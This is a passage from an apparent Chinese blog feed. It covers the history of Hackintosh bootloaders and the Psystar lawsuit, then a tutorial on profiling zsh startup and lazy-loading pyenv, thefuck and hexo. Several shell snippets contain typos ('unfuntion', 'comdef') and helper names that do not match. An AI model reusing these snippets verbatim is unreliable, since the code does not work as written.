OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali 